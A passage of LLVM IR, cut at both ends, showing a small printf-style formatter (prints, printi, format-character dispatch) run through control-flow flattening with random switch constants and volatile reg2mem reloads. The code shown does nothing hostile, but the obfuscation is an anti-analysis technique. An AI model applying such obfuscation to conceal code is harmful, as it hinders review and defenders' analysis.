  %123 = load i32, i32* %8, align 4
  %.reload12 = load volatile i8**, i8*** %.reg2mem11
  %124 = call i32 @prints(i8** %.reload12, i8* %.reload81, i32 %122, i32 %123)
  %125 = load i32, i32* %9, align 4
  %126 = add nsw i32 %125, %124
  store i32 %126, i32* %9, align 4
  store i32 -1944855197, i32* %switchVar
  br label %loopEnd

; <label>:127:                                    ; preds = %loopEntry
  %128 = load i8*, i8** %5, align 8
  %129 = load i8, i8* %128, align 1
  %130 = zext i8 %129 to i32
  %131 = icmp eq i32 %130, 100
  %132 = select i1 %131, i32 805110482, i32 1668417038
  store i32 %132, i32* %switchVar
  br label %loopEnd

; <label>:133:                                    ; preds = %loopEntry
  %134 = load i8**, i8*** %4, align 8
  store i8** %134, i8*** %.reg2mem13
  %135 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  store %struct.__va_list_tag* %135, %struct.__va_list_tag** %.reg2mem15
  %.reload18 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem15
  %136 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload18, i32 0, i32 0
  store i32* %136, i32** %.reg2mem19
  %.reload21 = load volatile i32*, i32** %.reg2mem19
  %137 = load i32, i32* %.reload21, align 8
  store i32 %137, i32* %.reg2mem22
  %.reload25 = load volatile i32, i32* %.reg2mem22
  %138 = icmp ule i32 %.reload25, 40
  %139 = select i1 %138, i32 -1982388577, i32 2048180947
  store i32 %139, i32* %switchVar
  br label %loopEnd

; <label>:140:                                    ; preds = %loopEntry
  %.reload17 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem15
  %141 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload17, i32 0, i32 3
  %142 = load i8*, i8** %141, align 8
  %.reload24 = load volatile i32, i32* %.reg2mem22
  %143 = getelementptr i8, i8* %142, i32 %.reload24
  %144 = bitcast i8* %143 to i32*
  %.reload23 = load volatile i32, i32* %.reg2mem22
  %145 = add i32 %.reload23, 8
  %.reload20 = load volatile i32*, i32** %.reg2mem19
  store i32 %145, i32* %.reload20, align 8
  store i32 -194771535, i32* %switchVar
  store i32* %144, i32** %.reg2mem82
  br label %loopEnd

; <label>:146:                                    ; preds = %loopEntry
  %.reload16 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem15
  %147 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload16, i32 0, i32 2
  %148 = load i8*, i8** %147, align 8
  %149 = bitcast i8* %148 to i32*
  %150 = getelementptr i8, i8* %148, i32 8
  store i8* %150, i8** %147, align 8
  store i32 -194771535, i32* %switchVar
  store i32* %149, i32** %.reg2mem82
  br label %loopEnd

; <label>:151:                                    ; preds = %loopEntry
  %.reload83 = load i32*, i32** %.reg2mem82
  %152 = load i32, i32* %.reload83, align 4
  %153 = load i32, i32* %7, align 4
  %154 = load i32, i32* %8, align 4
  %.reload14 = load volatile i8**, i8*** %.reg2mem13
  %155 = call i32 @printi(i8** %.reload14, i32 %152, i32 10, i32 1, i32 %153, i32 %154, i32 97)
  %156 = load i32, i32* %9, align 4
  %157 = add nsw i32 %156, %155
  store i32 %157, i32* %9, align 4
  store i32 -1944855197, i32* %switchVar
  br label %loopEnd

; <label>:158:                                    ; preds = %loopEntry
  %159 = load i8*, i8** %5, align 8
  %160 = load i8, i8* %159, align 1
  %161 = zext i8 %160 to i32
  %162 = icmp eq i32 %161, 120
  %163 = select i1 %162, i32 1647886917, i32 1200731590
  store i32 %163, i32* %switchVar
  br label %loopEnd

; <label>:164:                                    ; preds = %loopEntry
  %165 = load i8**, i8*** %4, align 8
  store i8** %165, i8*** %.reg2mem26
  %166 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  store %struct.__va_list_tag* %166, %struct.__va_list_tag** %.reg2mem28
  %.reload31 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem28
  %167 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload31, i32 0, i32 0
  store i32* %167, i32** %.reg2mem32
  %.reload34 = load volatile i32*, i32** %.reg2mem32
  %168 = load i32, i32* %.reload34, align 8
  store i32 %168, i32* %.reg2mem35
  %.reload38 = load volatile i32, i32* %.reg2mem35
  %169 = icmp ule i32 %.reload38, 40
  %170 = select i1 %169, i32 -1063110101, i32 -557847143
  store i32 %170, i32* %switchVar
  br label %loopEnd

; <label>:171:                                    ; preds = %loopEntry
  %.reload30 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem28
  %172 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload30, i32 0, i32 3
  %173 = load i8*, i8** %172, align 8
  %.reload37 = load volatile i32, i32* %.reg2mem35
  %174 = getelementptr i8, i8* %173, i32 %.reload37
  %175 = bitcast i8* %174 to i32*
  %.reload36 = load volatile i32, i32* %.reg2mem35
  %176 = add i32 %.reload36, 8
  %.reload33 = load volatile i32*, i32** %.reg2mem32
  store i32 %176, i32* %.reload33, align 8
  store i32 -1089165656, i32* %switchVar
  store i32* %175, i32** %.reg2mem84
  br label %loopEnd

; <label>:177:                                    ; preds = %loopEntry
  %.reload29 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem28
  %178 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload29, i32 0, i32 2
  %179 = load i8*, i8** %178, align 8
  %180 = bitcast i8* %179 to i32*
  %181 = getelementptr i8, i8* %179, i32 8
  store i8* %181, i8** %178, align 8
  store i32 -1089165656, i32* %switchVar
  store i32* %180, i32** %.reg2mem84
  br label %loopEnd

; <label>:182:                                    ; preds = %loopEntry
  %.reload85 = load i32*, i32** %.reg2mem84
  %183 = load i32, i32* %.reload85, align 4
  %184 = load i32, i32* %7, align 4
  %185 = load i32, i32* %8, align 4
  %.reload27 = load volatile i8**, i8*** %.reg2mem26
  %186 = call i32 @printi(i8** %.reload27, i32 %183, i32 16, i32 0, i32 %184, i32 %185, i32 97)
  %187 = load i32, i32* %9, align 4
  %188 = add nsw i32 %187, %186
  store i32 %188, i32* %9, align 4
  store i32 -1944855197, i32* %switchVar
  br label %loopEnd

; <label>:189:                                    ; preds = %loopEntry
  %190 = load i8*, i8** %5, align 8
  %191 = load i8, i8* %190, align 1
  %192 = zext i8 %191 to i32
  %193 = icmp eq i32 %192, 88
  %194 = select i1 %193, i32 966469798, i32 908459457
  store i32 %194, i32* %switchVar
  br label %loopEnd

; <label>:195:                                    ; preds = %loopEntry
  %196 = load i8**, i8*** %4, align 8
  store i8** %196, i8*** %.reg2mem39
  %197 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  store %struct.__va_list_tag* %197, %struct.__va_list_tag** %.reg2mem41
  %.reload44 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem41
  %198 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload44, i32 0, i32 0
  store i32* %198, i32** %.reg2mem45
  %.reload47 = load volatile i32*, i32** %.reg2mem45
  %199 = load i32, i32* %.reload47, align 8
  store i32 %199, i32* %.reg2mem48
  %.reload51 = load volatile i32, i32* %.reg2mem48
  %200 = icmp ule i32 %.reload51, 40
  %201 = select i1 %200, i32 504239420, i32 -2117681251
  store i32 %201, i32* %switchVar
  br label %loopEnd

; <label>:202:                                    ; preds = %loopEntry
  %.reload43 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem41
  %203 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload43, i32 0, i32 3
  %204 = load i8*, i8** %203, align 8
  %.reload50 = load volatile i32, i32* %.reg2mem48
  %205 = getelementptr i8, i8* %204, i32 %.reload50
  %206 = bitcast i8* %205 to i32*
  %.reload49 = load volatile i32, i32* %.reg2mem48
  %207 = add i32 %.reload49, 8
  %.reload46 = load volatile i32*, i32** %.reg2mem45
  store i32 %207, i32* %.reload46, align 8
  store i32 1313322315, i32* %switchVar
  store i32* %206, i32** %.reg2mem86
  br label %loopEnd

; <label>:208:                                    ; preds = %loopEntry
  %.reload42 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem41
  %209 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload42, i32 0, i32 2
  %210 = load i8*, i8** %209, align 8
  %211 = bitcast i8* %210 to i32*
  %212 = getelementptr i8, i8* %210, i32 8
  store i8* %212, i8** %209, align 8
  store i32 1313322315, i32* %switchVar
  store i32* %211, i32** %.reg2mem86
  br label %loopEnd

; <label>:213:                                    ; preds = %loopEntry
  %.reload87 = load i32*, i32** %.reg2mem86
  %214 = load i32, i32* %.reload87, align 4
  %215 = load i32, i32* %7, align 4
  %216 = load i32, i32* %8, align 4
  %.reload40 = load volatile i8**, i8*** %.reg2mem39
  %217 = call i32 @printi(i8** %.reload40, i32 %214, i32 16, i32 0, i32 %215, i32 %216, i32 65)
  %218 = load i32, i32* %9, align 4
  %219 = add nsw i32 %218, %217
  store i32 %219, i32* %9, align 4
  store i32 -1944855197, i32* %switchVar
  br label %loopEnd

; <label>:220:                                    ; preds = %loopEntry
  %221 = load i8*, i8** %5, align 8
  %222 = load i8, i8* %221, align 1
  %223 = zext i8 %222 to i32
  %224 = icmp eq i32 %223, 117
  %225 = select i1 %224, i32 1301608270, i32 98146341
  store i32 %225, i32* %switchVar
  br label %loopEnd

; <label>:226:                                    ; preds = %loopEntry
  %227 = load i8**, i8*** %4, align 8
  store i8** %227, i8*** %.reg2mem52
  %228 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  store %struct.__va_list_tag* %228, %struct.__va_list_tag** %.reg2mem54
  %.reload57 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem54
  %229 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload57, i32 0, i32 0
  store i32* %229, i32** %.reg2mem58
  %.reload60 = load volatile i32*, i32** %.reg2mem58
  %230 = load i32, i32* %.reload60, align 8
  store i32 %230, i32* %.reg2mem61
  %.reload64 = load volatile i32, i32* %.reg2mem61
  %231 = icmp ule i32 %.reload64, 40
  %232 = select i1 %231, i32 -706615006, i32 -411734558
  store i32 %232, i32* %switchVar
  br label %loopEnd

; <label>:233:                                    ; preds = %loopEntry
  %.reload56 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem54
  %234 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload56, i32 0, i32 3
  %235 = load i8*, i8** %234, align 8
  %.reload63 = load volatile i32, i32* %.reg2mem61
  %236 = getelementptr i8, i8* %235, i32 %.reload63
  %237 = bitcast i8* %236 to i32*
  %.reload62 = load volatile i32, i32* %.reg2mem61
  %238 = add i32 %.reload62, 8
  %.reload59 = load volatile i32*, i32** %.reg2mem58
  store i32 %238, i32* %.reload59, align 8
  store i32 -1279561209, i32* %switchVar
  store i32* %237, i32** %.reg2mem88
  br label %loopEnd

; <label>:239:                                    ; preds = %loopEntry
  %.reload55 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem54
  %240 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload55, i32 0, i32 2
  %241 = load i8*, i8** %240, align 8
  %242 = bitcast i8* %241 to i32*
  %243 = getelementptr i8, i8* %241, i32 8
  store i8* %243, i8** %240, align 8
  store i32 -1279561209, i32* %switchVar
  store i32* %242, i32** %.reg2mem88
  br label %loopEnd

; <label>:244:                                    ; preds = %loopEntry
  %.reload89 = load i32*, i32** %.reg2mem88
  %245 = load i32, i32* %.reload89, align 4
  %246 = load i32, i32* %7, align 4
  %247 = load i32, i32* %8, align 4
  %.reload53 = load volatile i8**, i8*** %.reg2mem52
  %248 = call i32 @printi(i8** %.reload53, i32 %245, i32 10, i32 0, i32 %246, i32 %247, i32 97)
  %249 = load i32, i32* %9, align 4
  %250 = add nsw i32 %249, %248
  store i32 %250, i32* %9, align 4
  store i32 -1944855197, i32* %switchVar
  br label %loopEnd

; <label>:251:                                    ; preds = %loopEntry
  %252 = load i8*, i8** %5, align 8
  %253 = load i8, i8* %252, align 1
  %254 = zext i8 %253 to i32
  %255 = icmp eq i32 %254, 99
  %256 = select i1 %255, i32 -278204659, i32 -224555710
  store i32 %256, i32* %switchVar
  br label %loopEnd

; <label>:257:                                    ; preds = %loopEntry
  %258 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  store %struct.__va_list_tag* %258, %struct.__va_list_tag** %.reg2mem65
  %.reload68 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem65
  %259 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload68, i32 0, i32 0
  store i32* %259, i32** %.reg2mem69
  %.reload71 = load volatile i32*, i32** %.reg2mem69
  %260 = load i32, i32* %.reload71, align 8
  store i32 %260, i32* %.reg2mem72
  %.reload75 = load volatile i32, i32* %.reg2mem72
  %261 = icmp ule i32 %.reload75, 40
  %262 = select i1 %261, i32 -665176535, i32 955737541
  store i32 %262, i32* %switchVar
  br label %loopEnd

; <label>:263:                                    ; preds = %loopEntry
  %.reload67 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem65
  %264 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload67, i32 0, i32 3
  %265 = load i8*, i8** %264, align 8
  %.reload74 = load volatile i32, i32* %.reg2mem72
  %266 = getelementptr i8, i8* %265, i32 %.reload74
  %267 = bitcast i8* %266 to i32*
  %.reload73 = load volatile i32, i32* %.reg2mem72
  %268 = add i32 %.reload73, 8
  %.reload70 = load volatile i32*, i32** %.reg2mem69
  store i32 %268, i32* %.reload70, align 8
  store i32 1294346230, i32* %switchVar
  store i32* %267, i32** %.reg2mem90
  br label %loopEnd

; <label>:269:                                    ; preds = %loopEntry
  %.reload66 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem65
  %270 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload66, i32 0, i32 2
  %271 = load i8*, i8** %270, align 8
  %272 = bitcast i8* %271 to i32*
  %273 = getelementptr i8, i8* %271, i32 8
  store i8* %273, i8** %270, align 8
  store i32 1294346230, i32* %switchVar
  store i32* %272, i32** %.reg2mem90
  br label %loopEnd

; <label>:274:                                    ; preds = %loopEntry
  %.reload91 = load i32*, i32** %.reg2mem90
  %275 = load i32, i32* %.reload91, align 4
  %276 = trunc i32 %275 to i8
  %277 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 0
  store i8 %276, i8* %277, align 1
  %278 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 1
  store i8 0, i8* %278, align 1
  %279 = load i8**, i8*** %4, align 8
  %280 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i32 0, i32 0
  %281 = load i32, i32* %7, align 4
  %282 = load i32, i32* %8, align 4
  %283 = call i32 @prints(i8** %279, i8* %280, i32 %281, i32 %282)
  %284 = load i32, i32* %9, align 4
  %285 = add nsw i32 %284, %283
  store i32 %285, i32* %9, align 4
  store i32 -1944855197, i32* %switchVar
  br label %loopEnd

; <label>:286:                                    ; preds = %loopEntry
  store i32 -1364502889, i32* %switchVar
  br label %loopEnd

; <label>:287:                                    ; preds = %loopEntry
  store i32 -913690677, i32* %switchVar
  br label %loopEnd

; <label>:288:                                    ; preds = %loopEntry
  %289 = load i8**, i8*** %4, align 8
  %290 = load i8*, i8** %5, align 8
  %291 = load i8, i8* %290, align 1
  %292 = zext i8 %291 to i32
  call void @printchar(i8** %289, i32 %292)
  %293 = load i32, i32* %9, align 4
  %294 = add nsw i32 %293, 1
  store i32 %294, i32* %9, align 4
  store i32 -1364502889, i32* %switchVar
  br label %loopEnd

; <label>:295:                                    ; preds = %loopEntry
  store i32 -1944855197, i32* %switchVar
  br label %loopEnd

; <label>:296:                                    ; preds = %loopEntry
  %297 = load i8*, i8** %5, align 8
  %298 = getelementptr inbounds i8, i8* %297, i32 1
  store i8* %298, i8** %5, align 8
  store i32 -522418850, i32* %switchVar
  br label %loopEnd

; <label>:299:                                    ; preds = %loopEntry
  %300 = load i8**, i8*** %4, align 8
  %301 = icmp ne i8** %300, null
  %302 = select i1 %301, i32 1982393874, i32 1053877051
  store i32 %302, i32* %switchVar
  br label %loopEnd

; <label>:303:                                    ; preds = %loopEntry
  %304 = load i8**, i8*** %4, align 8
  %305 = load i8*, i8** %304, align 8
  store i8 0, i8* %305, align 1
  store i32 1053877051, i32* %switchVar
  br label %loopEnd

; <label>:306:                                    ; preds = %loopEntry
  %307 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %308 = bitcast %struct.__va_list_tag* %307 to i8*
  call void @llvm.va_end(i8* %308)
  %309 = load i32, i32* %9, align 4
  ret i32 %309

loopEnd:                                          ; preds = %303, %299, %296, %295, %288, %287, %286, %274, %269, %263, %257, %251, %244, %239, %233, %226, %220, %213, %208, %202, %195, %189, %182, %177, %171, %164, %158, %151, %146, %140, %133, %127, %121, %120, %118, %110, %105, %99, %93, %87, %84, %75, %73, %68, %62, %61, %56, %50, %49, %46, %40, %39, %33, %32, %24, %18, %12, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @prints(i8**, i8*, i32, i32) #0 {
  %.reg2mem = alloca i32
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  store i8** %0, i8*** %5, align 8
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  store i32 %3, i32* %8, align 4
  store i32 0, i32* %9, align 4
  store i32 32, i32* %10, align 4
  %13 = load i32, i32* %7, align 4
  store i32 %13, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -639730352, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %4
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -639730352, label %first
    i32 2026519720, label %16
    i32 1613662994, label %18
    i32 -1849181451, label %23
    i32 -899748831, label %26
    i32 -1188595398, label %29
    i32 -1933290482, label %34
    i32 58312848, label %35
    i32 1522157370, label %39
    i32 -817200433, label %44
    i32 1360774698, label %45
    i32 -1117428598, label %46
    i32 -176001389, label %51
    i32 2143282966, label %52
    i32 196419476, label %56
    i32 -1289875091, label %61
    i32 1830921017, label %64
    i32 -2109977563, label %65
    i32 1102840392, label %66
    i32 -1951886968, label %71
    i32 894336428, label %78
    i32 1500562022, label %81
    i32 -1108861426, label %82
    i32 524396159, label %86
    i32 -1066067666, label %91
    i32 618032536, label %94
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %14 = icmp sgt i32 %.reload, 0
  %15 = select i1 %14, i32 2026519720, i32 -1117428598
  store i32 %15, i32* %switchVar
  br label %loopEnd

; <label>:16:                                     ; preds = %loopEntry
  store i32 0, i32* %11, align 4
  %17 = load i8*, i8** %6, align 8
  store i8* %17, i8** %12, align 8
  store i32 1613662994, i32* %switchVar
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  %19 = load i8*, i8** %12, align 8
  %20 = load i8, i8* %19, align 1
  %21 = icmp ne i8 %20, 0
  %22 = select i1 %21, i32 -1849181451, i32 -1188595398
  store i32 %22, i32* %switchVar
  br label %loopEnd

; <label>:23:                                     ; preds = %loopEntry
  %24 = load i32, i32* %11, align 4
  %25 = add nsw i32 %24, 1
  store i32 %25, i32* %11, align 4
  store i32 -899748831, i32* %switchVar
  br label %loopEnd

; <label>:26:                                     ; preds = %loopEntry
  %27 = load i8*, i8** %12, align 8
  %28 = getelementptr inbounds i8, i8* %27, i32 1
  store i8* %28, i8** %12, align 8
  store i32 1613662994, i32* %switchVar
  br label %loopEnd

; <label>:29:                                     ; preds = %loopEntry
  %30 = load i32, i32* %11, align 4
  %31 = load i32, i32* %7, align 4
  %32 = icmp sge i32 %30, %31
  %33 = select i1 %32, i32 -1933290482, i32 58312848
  store i32 %33, i32* %switchVar
  br label %loopEnd

; <label>:34:                                     ; preds = %loopEntry
  store i32 0, i32* %7, align 4
  store i32 1522157370, i32* %switchVar
  br label %loopEnd

; <label>:35:                                     ; preds = %loopEntry
  %36 = load i32, i32* %11, align 4
  %37 = load i32, i32* %7, align 4
  %38 = sub nsw i32 %37, %36
  store i32 %38, i32* %7, align 4
  store i32 1522157370, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  %40 = load i32, i32* %8, align 4
  %41 = and i32 %40, 2
  %42 = icmp ne i32 %41, 0
  %43 = select i1 %42, i32 -817200433, i32 1360774698
  store i32 %43, i32* %switchVar
  br label %loopEnd

; <label>:44:                                     ; preds = %loopEntry
  store i32 48, i32* %10, align 4
  store i32 1360774698, i32* %switchVar
  br label %loopEnd

; <label>:45:                                     ; preds = %loopEntry
  store i32 -1117428598, i32* %switchVar
  br label %loopEnd

; <label>:46:                                     ; preds = %loopEntry
  %47 = load i32, i32* %8, align 4
  %48 = and i32 %47, 1
  %49 = icmp ne i32 %48, 0
  %50 = select i1 %49, i32 -2109977563, i32 -176001389
  store i32 %50, i32* %switchVar
  br label %loopEnd

; <label>:51:                                     ; preds = %loopEntry
  store i32 2143282966, i32* %switchVar
  br label %loopEnd

; <label>:52:                                     ; preds = %loopEntry
  %53 = load i32, i32* %7, align 4
  %54 = icmp sgt i32 %53, 0
  %55 = select i1 %54, i32 196419476, i32 1830921017
  store i32 %55, i32* %switchVar
  br label %loopEnd

; <label>:56:                                     ; preds = %loopEntry
  %57 = load i8**, i8*** %5, align 8
  %58 = load i32, i32* %10, align 4
  call void @printchar(i8** %57, i32 %58)
  %59 = load i32, i32* %9, align 4
  %60 = add nsw i32 %59, 1
  store i32 %60, i32* %9, align 4
  store i32 -1289875091, i32* %switchVar
  br label %loopEnd

; <label>:61:                                     ; preds = %loopEntry
  %62 = load i32, i32* %7, align 4
  %63 = add nsw i32 %62, -1
  store i32 %63, i32* %7, align 4
  store i32 2143282966, i32* %switchVar
  br label %loopEnd

; <label>:64:                                     ; preds = %loopEntry
  store i32 -2109977563, i32* %switchVar
  br label %loopEnd

; <label>:65:                                     ; preds = %loopEntry
  store i32 1102840392, i32* %switchVar
  br label %loopEnd

; <label>:66:                                     ; preds = %loopEntry
  %67 = load i8*, i8** %6, align 8
  %68 = load i8, i8* %67, align 1
  %69 = icmp ne i8 %68, 0
  %70 = select i1 %69, i32 -1951886968, i32 1500562022
  store i32 %70, i32* %switchVar
  br label %loopEnd

; <label>:71:                                     ; preds = %loopEntry
  %72 = load i8**, i8*** %5, align 8
  %73 = load i8*, i8** %6, align 8
  %74 = load i8, i8* %73, align 1
  %75 = zext i8 %74 to i32
  call void @printchar(i8** %72, i32 %75)
  %76 = load i32, i32* %9, align 4
  %77 = add nsw i32 %76, 1
  store i32 %77, i32* %9, align 4
  store i32 894336428, i32* %switchVar
  br label %loopEnd

; <label>:78:                                     ; preds = %loopEntry
  %79 = load i8*, i8** %6, align 8
  %80 = getelementptr inbounds i8, i8* %79, i32 1
  store i8* %80, i8** %6, align 8
  store i32 1102840392, i32* %switchVar
  br label %loopEnd

; <label>:81:                                     ; preds = %loopEntry
  store i32 -1108861426, i32* %switchVar
  br label %loopEnd

; <label>:82:                                     ; preds = %loopEntry
  %83 = load i32, i32* %7, align 4
  %84 = icmp sgt i32 %83, 0
  %85 = select i1 %84, i32 524396159, i32 618032536
  store i32 %85, i32* %switchVar
  br label %loopEnd

; <label>:86:                                     ; preds = %loopEntry
  %87 = load i8**, i8*** %5, align 8
  %88 = load i32, i32* %10, align 4
  call void @printchar(i8** %87, i32 %88)
  %89 = load i32, i32* %9, align 4
  %90 = add nsw i32 %89, 1
  store i32 %90, i32* %9, align 4
  store i32 -1066067666, i32* %switchVar
  br label %loopEnd

; <label>:91:                                     ; preds = %loopEntry
  %92 = load i32, i32* %7, align 4
  %93 = add nsw i32 %92, -1
  store i32 %93, i32* %7, align 4
  store i32 -1108861426, i32* %switchVar
  br label %loopEnd

; <label>:94:                                     ; preds = %loopEntry
  %95 = load i32, i32* %9, align 4
  ret i32 %95

loopEnd:                                          ; preds = %91, %86, %82, %81, %78, %71, %66, %65, %64, %61, %56, %52, %51, %46, %45, %44, %39, %35, %34, %29, %26, %23, %18, %16, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @printi(i8**, i32, i32, i32, i32, i32, i32) #0 {
  %.reg2mem = alloca i32
  %8 = alloca i32, align 4
  %9 = alloca i8**, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca [12 x i8], align 1
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  store i8** %0, i8*** %9, align 8
  store i32 %1, i32* %10, align 4
  store i32 %2, i32* %11, align 4
  store i32 %3, i32* %12, align 4
  store i32 %4, i32* %13, align 4
  store i32 %5, i32* %14, align 4
  store i32 %6, i32* %15, align 4
  store i32 0, i32* %19, align 4
  store i32 0, i32* %20, align 4
  %22 = load i32, i32* %10, align 4
  store i32 %22, i32* %21, align 4
  %23 = load i32, i32* %10, align 4
  store i32 %23, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 224025204, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %7
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 224025204, label %first
    i32 -455132014, label %26
    i32 -1134193095, label %34
    i32 1647132811, label %38
    i32 -208118677, label %42
    i32 -2103351953, label %46
    i32 465502738, label %49
    i32 1633498592, label %54
    i32 -1069221932, label %58
    i32 1791530795, label %65
    i32 632307904, label %71
    i32 -1507707447, label %80
    i32 1609548454, label %84
    i32 -1052791529, label %88
    i32 -1078691139, label %93
    i32 123538288, label %99
    i32 -1809861956, label %102
    i32 -1219564553, label %103
    i32 796504123, label %111
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %24 = icmp eq i32 %.reload, 0
  %25 = select i1 %24, i32 -455132014, i32 -1134193095
  store i32 %25, i32* %switchVar
  br label %loopEnd

; <label>:26:                                     ; preds = %loopEntry
  %27 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 0
  store i8 48, i8* %27, align 1
  %28 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 1
  store i8 0, i8* %28, align 1
  %29 = load i8**, i8*** %9, align 8
  %30 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i32 0, i32 0
  %31 = load i32, i32* %13, align 4
  %32 = load i32, i32* %14, align 4
  %33 = call i32 @prints(i8** %29, i8* %30, i32 %31, i32 %32)
  store i32 %33, i32* %8, align 4
  store i32 796504123, i32* %switchVar
  br label %loopEnd

; <label>:34:                                     ; preds = %loopEntry
  %35 = load i32, i32* %12, align 4
  %36 = icmp ne i32 %35, 0
  %37 = select i1 %36, i32 1647132811, i32 465502738
  store i32 %37, i32* %switchVar
  br label %loopEnd

; <label>:38:                                     ; preds = %loopEntry
  %39 = load i32, i32* %11, align 4
  %40 = icmp eq i32 %39, 10
  %41 = select i1 %40, i32 -208118677, i32 465502738
  store i32 %41, i32* %switchVar
  br label %loopEnd

; <label>:42:                                     ; preds = %loopEntry
  %43 = load i32, i32* %10, align 4
  %44 = icmp slt i32 %43, 0
  %45 = select i1 %44, i32 -2103351953, i32 465502738
  store i32 %45, i32* %switchVar
  br label %loopEnd

; <label>:46:                                     ; preds = %loopEntry
  store i32 1, i32* %19, align 4
  %47 = load i32, i32* %10, align 4
  %48 = sub nsw i32 0, %47
  store i32 %48, i32* %21, align 4
  store i32 465502738, i32* %switchVar
  br label %loopEnd

; <label>:49:                                     ; preds = %loopEntry
  %50 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i32 0, i32 0
  %51 = getelementptr inbounds i8, i8* %50, i64 12
  %52 = getelementptr inbounds i8, i8* %51, i64 -1
  store i8* %52, i8** %17, align 8
  %53 = load i8*, i8** %17, align 8
  store i8 0, i8* %53, align 1
  store i32 1633498592, i32* %switchVar
  br label %loopEnd

; <label>:54:                                     ; preds = %loopEntry
  %55 = load i32, i32* %21, align 4
  %56 = icmp ne i32 %55, 0
  %57 = select i1 %56, i32 -1069221932, i32 -1507707447
  store i32 %57, i32* %switchVar
  br label %loopEnd

; <label>:58:                                     ; preds = %loopEntry
  %59 = load i32, i32* %21, align 4
  %60 = load i32, i32* %11, align 4
  %61 = urem i32 %59, %60
  store i32 %61, i32* %18, align 4
  %62 = load i32, i32* %18, align 4
  %63 = icmp sge i32 %62, 10
  %64 = select i1 %63, i32 1791530795, i32 632307904
  store i32 %64, i32* %switchVar
  br label %loopEnd

; <label>:65:                                     ; preds = %loopEntry
  %66 = load i32, i32* %15, align 4
  %67 = sub nsw i32 %66, 48
  %68 = sub nsw i32 %67, 10
  %69 = load i32, i32* %18, align 4
  %70 = add nsw i32 %69, %68
  store i32 %70, i32* %18, align 4
  store i32 632307904, i32* %switchVar
  br label %loopEnd

; <label>:71:                                     ; preds = %loopEntry
  %72 = load i32, i32* %18, align 4
  %73 = add nsw i32 %72, 48
  %74 = trunc i32 %73 to i8
